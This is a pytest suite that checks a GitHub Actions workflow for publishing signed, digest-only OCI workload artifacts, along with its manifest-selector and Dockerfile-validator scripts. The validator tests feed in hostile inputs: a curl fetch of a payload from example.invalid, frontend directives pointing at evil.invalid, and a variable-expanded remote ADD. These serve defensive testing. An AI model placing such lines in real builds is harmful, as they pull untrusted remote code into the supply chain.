import hashlib
import json
import re
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github/workflows/workload-artifacts.yml"


def workflow() -> str:
    return WORKFLOW.read_text()


def job(job_name: str) -> str:
    lines = workflow().splitlines()
    job_start = lines.index(f"  {job_name}:") + 1
    job_lines: list[str] = []
    for line in lines[job_start:]:
        if re.fullmatch(r"  [a-zA-Z0-9_-]+:", line):
            break
        job_lines.append(line)
    return "\n".join(job_lines)


def workflow_step(job_name: str, step_name: str) -> str:
    lines = job(job_name).splitlines()
    step_start = lines.index(f"      - name: {step_name}")
    step_lines: list[str] = []
    for line in lines[step_start:]:
        if line.startswith("      - name: ") and step_lines:
            break
        step_lines.append(line)
    return "\n".join(step_lines)


def test_publication_accepts_only_reviewed_main_requests() -> None:
    text = workflow()
    authorization = job("authorize-request")

    assert "name: Workload artifact build" in text
    assert "workflow_dispatch:" in text
    assert "push:" not in text
    assert "workload-artifact-*" not in text
    assert "pull_request:" not in text
    assert "branches:" not in text
    assert "github.event_name == 'workflow_dispatch'" in authorization
    assert "github.ref == 'refs/heads/main'" in authorization
    assert "refs/tags/" not in authorization
    assert (
        'git merge-base --is-ancestor "$source_commit" refs/remotes/origin/main'
        in authorization
    )
    assert "ref: ${{ github.sha }}" in job("publish-workload-artifact")


def test_build_request_is_bounded_and_validated_before_any_publication() -> None:
    authorization = job("authorize-request")
    publisher = job("publish-workload-artifact")

    assert "scripts/workload-artifact-metadata request" in authorization
    assert "release/workloads/" in authorization
    assert "[a-z0-9][a-z0-9_.-]{0,127}\\.json$" in authorization
    assert 'test ! -L "$request_path"' in authorization
    for output in (
        "request_path",
        "request_digest",
        "source_commit",
        "context_digest",
        "context",
        "dockerfile",
        "target",
        "architecture",
        "output_repository",
        "base_images",
    ):
        assert f"{output}: ${{{{ steps.request.outputs.{output} }}}}" in authorization
    assert "jq -er '.build_request_digest'" in authorization
    for field in (
        "source_commit",
        "context_digest",
        "context",
        "dockerfile",
        "target",
        "architecture",
        "output_repository",
        "base_images",
    ):
        assert f".request.{field}" in authorization
    assert "GITHUB_REPOSITORY_OWNER" in authorization
    assert "GITHUB_REPOSITORY" in authorization
    assert "expected_output_repository" in authorization
    assert '${repository_name,,}-workloads' in authorization
    assert "output repository must be owned by this GitHub organization" in authorization
    assert "needs: [authorize-request, read-only-ci-gate]" in publisher


def test_publication_waits_for_successful_read_only_ci_on_the_exact_commit() -> None:
    gate = job("read-only-ci-gate")
    publisher = job("publish-workload-artifact")

    assert "needs: authorize-request" in gate
    assert "permissions:\n      actions: read\n      contents: read" in gate
    assert "needs.authorize-request.outputs.source_commit" in gate
    assert "gh run list" in gate
    assert "--workflow ci.yml" in gate
    assert "--commit \"$SOURCE_COMMIT\"" in gate
    assert "conclusion == \"success\"" in gate
    assert "packages: write" not in gate
    assert "id-token: write" not in gate
    assert "needs: [authorize-request, read-only-ci-gate]" in publisher


def test_publish_job_does_not_install_or_cache_unused_uv_environment() -> None:
    text = workflow()
    authorization = job("authorize-request")
    publisher = job("publish-workload-artifact")

    assert "setup-uv@" in authorization
    assert "setup-uv@" not in publisher
    assert text.count("setup-uv@") == 1


def test_only_build_job_can_write_packages_and_token_is_not_a_build_input() -> None:
    text = workflow()
    authorization = job("authorize-request")
    gate = job("read-only-ci-gate")
    publisher = job("publish-workload-artifact")
    login = workflow_step("publish-workload-artifact", "Log in to GHCR")
    build = workflow_step("publish-workload-artifact", "Build digest-only OCI artifact")

    assert "permissions:\n  contents: read" in text
    assert "contents: read" in publisher
    assert "packages: write" in publisher
    assert text.count("packages: write") == 1
    assert "packages: write" not in authorization
    assert "packages: write" not in gate
    assert "password: ${{ secrets.GITHUB_TOKEN }}" in login
    for forbidden in (
        "secrets.GITHUB_TOKEN",
        "build-args:",
        "secret-envs:",
        "secret-files:",
        "secrets:",
    ):
        assert forbidden not in build


def test_build_publishes_digest_only_with_sbom_and_provenance() -> None:
    publisher = job("publish-workload-artifact")
    build = workflow_step("publish-workload-artifact", "Build digest-only OCI artifact")
    evidence = workflow_step(
        "publish-workload-artifact", "Collect workload artifact evidence"
    )
    result = workflow_step(
        "publish-workload-artifact", "Create workload artifact result"
    )

    assert "docker/build-push-action@" in build
    assert "path: workload-source" in publisher
    assert "context: ${{ steps.source.outputs.verified_context }}" in build
    assert "file: ${{ steps.source.outputs.verified_dockerfile }}" in build
    assert "context: workload-source/" not in build
    assert "file: workload-source/" not in build
    assert "target: ${{ needs.authorize-request.outputs.target }}" in build
    assert "platforms: ${{ needs.authorize-request.outputs.architecture }}" in build
    assert "push-by-digest=true" in build
    assert "name-canonical=true" in build
    assert "push=true" in build
    assert "tags:" not in build
    assert "sbom: true" in build
    assert "provenance: mode=max" in build
    assert "network: none" in build
    assert "steps.build.outputs.digest" in evidence
    assert "docker buildx imagetools inspect" in evidence
    assert "workload-artifact-build-result" in result
    assert "scripts/workload-artifact-metadata result" in result
    assert "sha256sum" in result


def test_build_normalizes_digest_affecting_timestamps_to_source_commit() -> None:
    source = workflow_step("publish-workload-artifact", "Verify exact source context")
    build = workflow_step(
        "publish-workload-artifact", "Build digest-only OCI artifact"
    )

    assert 'git -C workload-source show -s --format=%ct "$SOURCE_COMMIT"' in source
    assert "source commit timestamp is invalid" in source
    assert "source_date_epoch=" in source
    assert "SOURCE_DATE_EPOCH: ${{ steps.source.outputs.source_date_epoch }}" in build
    assert "rewrite-timestamp=true" in build


def test_acceptance_identity_is_the_reproducible_runtime_manifest() -> None:
    evidence = workflow_step(
        "publish-workload-artifact", "Collect workload artifact evidence"
    )
    result = workflow_step(
        "publish-workload-artifact", "Create workload artifact result"
    )

    assert "id: evidence" in evidence
    assert "OCI_INDEX_DIGEST: ${{ steps.build.outputs.digest }}" in evidence
    assert "workload-artifact-output/oci-index.json" in evidence
    assert "scripts/select-workload-runtime-manifest" in evidence
    assert "runtime_digest=" in evidence
    assert 'printf \'runtime_digest=%s\\n\'' in evidence
    assert "runtime manifest does not match selected digest" in evidence
    assert (
        "OCI_MANIFEST_DIGEST: ${{ steps.evidence.outputs.runtime_digest }}" in result
    )


def _run_runtime_manifest_selector(
    tmp_path: Path,
    index: dict[str, object] | bytes,
    architecture: str = "linux/arm64",
) -> subprocess.CompletedProcess[str]:
    output = tmp_path / "workload-artifact-output"
    output.mkdir()
    raw = (
        index
        if isinstance(index, bytes)
        else json.dumps(index, separators=(",", ":")).encode()
    )
    index_path = output / "oci-index.json"
    index_path.write_bytes(raw + b"\n")
    index_digest = "sha256:" + hashlib.sha256(raw).hexdigest()
    return subprocess.run(
        [
            ROOT / "scripts/select-workload-runtime-manifest",
            index_path,
            architecture,
            index_digest,
        ],
        check=False,
        capture_output=True,
        text=True,
    )


def _runtime_descriptor(
    digest: str, *, os_name: str = "linux", architecture: str = "arm64"
) -> dict[str, object]:
    return {
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "digest": digest,
        "size": 42,
        "platform": {"os": os_name, "architecture": architecture},
    }


def _attestation_descriptor(
    runtime_digest: str,
    *,
    digest: str | None = None,
) -> dict[str, object]:
    return {
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "digest": digest or f"sha256:{'b' * 64}",
        "size": 43,
        "annotations": {
            "vnd.docker.reference.digest": runtime_digest,
            "vnd.docker.reference.type": "attestation-manifest",
        },
        "platform": {"os": "unknown", "architecture": "unknown"},
    }


def _valid_runtime_index(runtime_digest: str) -> dict[str, object]:
    return {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [
            _runtime_descriptor(runtime_digest),
            _attestation_descriptor(runtime_digest),
        ],
    }


def test_runtime_manifest_selector_accepts_one_requested_executable(
    tmp_path: Path,
) -> None:
    runtime_digest = f"sha256:{'a' * 64}"
    result = _run_runtime_manifest_selector(
        tmp_path,
        _valid_runtime_index(runtime_digest),
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == runtime_digest


def test_runtime_manifest_selector_rejects_multiple_executables(
    tmp_path: Path,
) -> None:
    descriptors = [
        _runtime_descriptor(f"sha256:{character * 64}")
        for character in ("a", "b")
    ]

    result = _run_runtime_manifest_selector(
        tmp_path,
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "manifests": descriptors,
        },
    )

    assert result.returncode != 0
    assert "exactly one executable manifest" in result.stderr


@pytest.mark.parametrize(
    "index",
    [
        {
            "schemaVersion": 1,
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "manifests": [],
        },
        {
            "schemaVersion": 2.0,
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "manifests": [],
        },
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.docker.distribution.manifest.list.v2+json",
            "manifests": [],
        },
    ],
)
def test_runtime_manifest_selector_rejects_invalid_index_metadata(
    tmp_path: Path, index: dict[str, object]
) -> None:
    result = _run_runtime_manifest_selector(tmp_path, index)

    assert result.returncode != 0
    assert "OCI index metadata is invalid" in result.stderr


def test_runtime_manifest_selector_rejects_duplicate_json_keys(tmp_path: Path) -> None:
    raw = (
        b'{"schemaVersion":2,"schemaVersion":1,'
        b'"mediaType":"application/vnd.oci.image.index.v1+json","manifests":[]}'
    )

    result = _run_runtime_manifest_selector(tmp_path, raw)

    assert result.returncode != 0
    assert "duplicate JSON key" in result.stderr


def test_runtime_manifest_selector_rejects_wrong_platform_only(tmp_path: Path) -> None:
    runtime_digest = f"sha256:{'a' * 64}"
    index = _valid_runtime_index(runtime_digest)
    index["manifests"][0] = _runtime_descriptor(  # type: ignore[index]
        runtime_digest, architecture="amd64"
    )

    result = _run_runtime_manifest_selector(tmp_path, index)

    assert result.returncode != 0
    assert "exactly one executable manifest" in result.stderr


def test_runtime_manifest_selector_requires_one_attestation(tmp_path: Path) -> None:
    runtime_digest = f"sha256:{'a' * 64}"
    index = _valid_runtime_index(runtime_digest)
    index["manifests"] = [_runtime_descriptor(runtime_digest)]

    result = _run_runtime_manifest_selector(tmp_path, index)

    assert result.returncode != 0
    assert "BuildKit attestation descriptor is invalid" in result.stderr


def test_runtime_manifest_selector_rejects_extra_executable_fields(
    tmp_path: Path,
) -> None:
    runtime_digest = f"sha256:{'a' * 64}"
    index = _valid_runtime_index(runtime_digest)
    descriptor = index["manifests"][0]  # type: ignore[index]
    assert isinstance(descriptor, dict)
    descriptor["annotations"] = {"unexpected": "metadata"}

    result = _run_runtime_manifest_selector(tmp_path, index)

    assert result.returncode != 0
    assert "OCI executable descriptor is invalid" in result.stderr


@pytest.mark.parametrize(
    "mutate",
    [
        lambda descriptor: descriptor.pop("annotations"),
        lambda descriptor: descriptor.update(
            mediaType="application/vnd.docker.distribution.manifest.v2+json"
        ),
        lambda descriptor: descriptor.update(size=0),
        lambda descriptor: descriptor.update(digest="sha256:NOT-CANONICAL"),
        lambda descriptor: descriptor["annotations"].update(  # type: ignore[union-attr]
            {"vnd.docker.reference.digest": f"sha256:{'c' * 64}"}
        ),
        lambda descriptor: descriptor["annotations"].update(  # type: ignore[union-attr]
            {"vnd.docker.reference.type": "unrelated"}
        ),
    ],
)
def test_runtime_manifest_selector_rejects_invalid_attestation_descriptor(
    tmp_path: Path, mutate: object
) -> None:
    runtime_digest = f"sha256:{'a' * 64}"
    index = _valid_runtime_index(runtime_digest)
    descriptor = index["manifests"][1]  # type: ignore[index]
    assert isinstance(descriptor, dict)
    mutate(descriptor)  # type: ignore[operator]

    result = _run_runtime_manifest_selector(tmp_path, index)

    assert result.returncode != 0
    assert "BuildKit attestation descriptor is invalid" in result.stderr


def test_exact_context_and_declared_base_images_are_verified_before_build() -> None:
    publisher = job("publish-workload-artifact")
    source = workflow_step("publish-workload-artifact", "Verify exact source context")
    build = workflow_step("publish-workload-artifact", "Build digest-only OCI artifact")

    assert "git -C workload-source archive" in source
    assert "id: source" in source
    assert "tar -xf" in source
    assert "verified_context=" in source
    assert "verified_dockerfile=" in source
    assert 'chmod -R a-w "$verified_root"' in source
    assert "EXPECTED_CONTEXT_DIGEST" in source
    assert "needs.authorize-request.outputs.context_digest" in source
    assert "DECLARED_BASE_IMAGES" in source
    assert "needs.authorize-request.outputs.base_images" in source
    assert "scripts/validate-workload-dockerfile" in source
    assert publisher.index("Verify exact source context") < publisher.index(
        "Log in to GHCR"
    )
    assert publisher.index("Verify exact source context") < publisher.index(
        "Build digest-only OCI artifact"
    )
    assert "build-args:" not in build


def _run_dockerfile_validator(
    tmp_path: Path, dockerfile_text: str
) -> subprocess.CompletedProcess[str]:
    base = f"nvcr.io/nvidia/cuda@sha256:{'a' * 64}"
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(dockerfile_text.replace("{base}", base))

    return subprocess.run(
        [ROOT / "scripts/validate-workload-dockerfile", dockerfile, json.dumps([base])],
        check=False,
        capture_output=True,
        text=True,
    )


@pytest.mark.parametrize(
    "run_instruction",
    (
        "RUN --network=default curl https://example.invalid/payload",
        "RUN --network=defa\\\nult curl https://example.invalid/payload",
    ),
)
def test_dockerfile_validator_rejects_run_network_override(
    tmp_path: Path, run_instruction: str
) -> None:
    result = _run_dockerfile_validator(
        tmp_path,
        f"FROM {{base}} AS runtime\n{run_instruction}\n",
    )

    assert result.returncode != 0
    assert "RUN network overrides are forbidden" in result.stderr


@pytest.mark.parametrize(
    "directive",
    (
        "\ufeff# syntax=evil.invalid/frontend:latest",
        "// syntax=evil.invalid/frontend:latest",
        '{"syntax":"evil.invalid/frontend:latest"}',
    ),
)
def test_dockerfile_validator_rejects_all_buildkit_frontend_forms(
    tmp_path: Path, directive: str
) -> None:
    result = _run_dockerfile_validator(
        tmp_path,
        f"{directive}\nFROM {{base}} AS runtime\n",
    )

    assert result.returncode != 0
    assert "Dockerfile frontend directives are forbidden" in result.stderr


def test_dockerfile_validator_rejects_variable_expanded_remote_add(
    tmp_path: Path,
) -> None:
    result = _run_dockerfile_validator(
        tmp_path,
        "FROM {base} AS runtime\n"
        "ENV PAYLOAD=https://example.invalid/payload\n"
        "ADD $PAYLOAD /payload\n",
    )

    assert result.returncode != 0
    assert "variable ADD inputs are forbidden" in result.stderr


def test_result_rejects_manifest_or_attestation_evidence_mismatch() -> None:
    evidence = workflow_step(
        "publish-workload-artifact", "Collect workload artifact evidence"
    )

    assert "scripts/select-workload-runtime-manifest" in evidence
    assert "OCI_INDEX_DIGEST" in evidence
    assert "runtime_digest" in evidence
    assert "runtime manifest does not match selected digest" in evidence
    assert 'jq -e \'if type == "object" or type == "array"' in evidence
    assert "SBOM evidence is empty" in evidence
    assert "provenance evidence is empty" in evidence
    assert ".SBOM.SPDX" in evidence
    assert ".Provenance.SLSA" in evidence
    assert "spdxVersion" in evidence


def test_sbom_validation_accepts_document_and_rejects_buildx_wrapper() -> None:
    evidence = workflow_step(
        "publish-workload-artifact", "Collect workload artifact evidence"
    )
    match = re.search(r"jq -e -S -c '([^']*spdxVersion[^']*)'", evidence)
    assert match is not None
    jq_filter = match.group(1)
    spdx = {
        "SPDXID": "SPDXRef-DOCUMENT",
        "dataLicense": "CC0-1.0",
        "spdxVersion": "SPDX-2.3",
    }

    valid = subprocess.run(
        ["jq", "-e", "-S", "-c", jq_filter],
        input=json.dumps(spdx),
        check=False,
        capture_output=True,
        text=True,
    )
    wrapped = subprocess.run(
        ["jq", "-e", "-S", "-c", jq_filter],
        input=json.dumps({"SPDX": spdx}),
        check=False,
        capture_output=True,
        text=True,
    )

    assert valid.returncode == 0, valid.stderr
    assert json.loads(valid.stdout) == spdx
    assert wrapped.returncode != 0


def test_sigstore_attests_provenance_and_sbom_without_tuf_credentials() -> None:
    publisher = job("publish-workload-artifact")
    provenance = workflow_step(
        "publish-workload-artifact", "Sign workload provenance"
    )
    sbom = workflow_step("publish-workload-artifact", "Sign workload SBOM")

    assert (
        "permissions:\n      artifact-metadata: write\n      attestations: write\n      contents: read\n"
        "      id-token: write\n      packages: write"
    ) in publisher
    assert (
        "actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6" in provenance
    )
    assert "subject-name: ${{ needs.authorize-request.outputs.output_repository }}" in provenance
    assert "subject-digest: ${{ steps.evidence.outputs.runtime_digest }}" in provenance
    assert "steps.build.outputs.digest" not in provenance
    assert "push-to-registry: true" in provenance
    assert (
        "predicate-type: https://vonk-forge.dev/attestations/"
        "workload-artifact-build/v1"
    ) in provenance
    assert "predicate-path: workload-artifact-output/provenance-predicate.json" in provenance
    evidence = workflow_step(
        "publish-workload-artifact", "Collect workload artifact evidence"
    )
    for binding in (
        "BUILD_REQUEST_DIGEST",
        "SOURCE_COMMIT",
        "CONTEXT_DIGEST",
        "TARGET",
        "ARCHITECTURE",
        "BASE_IMAGES",
    ):
        assert binding in evidence
    assert "provenance-predicate.json" in evidence
    assert "sbom-path: workload-artifact-output/sbom.json" in sbom
    assert "subject-name: ${{ needs.authorize-request.outputs.output_repository }}" in sbom
    assert "subject-digest: ${{ steps.evidence.outputs.runtime_digest }}" in sbom
    assert "steps.build.outputs.digest" not in sbom
    assert "push-to-registry: true" in sbom
    assert workflow().count("id-token: write") == 1
    assert workflow().count("attestations: write") == 1
    assert workflow().count("artifact-metadata: write") == 1
    assert "steps.provenance-attestation.outputs.bundle-path" in publisher
    assert "steps.sbom-attestation.outputs.bundle-path" in publisher
    result = workflow_step(
        "publish-workload-artifact", "Create workload artifact result"
    )
    assert "signed-provenance.bundle.json" in result
    assert "signed-sbom.bundle.json" in result
    assert 'sha256sum "$PROVENANCE_BUNDLE"' in result
    assert 'sha256sum "$SBOM_BUNDLE"' in result
    assert publisher.index("Collect workload artifact evidence") < publisher.index(
        "Sign workload provenance"
    )
    assert publisher.index("Sign workload SBOM") < publisher.index(
        "Create workload artifact result"
    )


def test_build_workflow_has_no_release_or_desired_state_authority() -> None:
    text = workflow().lower()

    for forbidden in (
        "vonk_workload_tuf",
        "vonk_platform_tuf",
        "workload_tuf_key",
        "platform_tuf_key",
        "desired_state",
        "desired-state",
        "promote-workload",
        "publish-platform-target",
        "container-release-metadata",
        "release-manifest:",
    ):
        assert forbidden not in text


def test_workload_outputs_are_distinct_from_fixed_platform_images() -> None:
    text = workflow()
    publisher = job("publish-workload-artifact")

    assert "group: vonk-forge-workload-artifact-publication" in publisher
    assert "cancel-in-progress: false" in publisher
    assert "vonk-forge-api" not in text
    assert "vonk-forge-worker" not in text
    assert "vonk-forge-hermes" not in text
    assert "platform-release" not in text
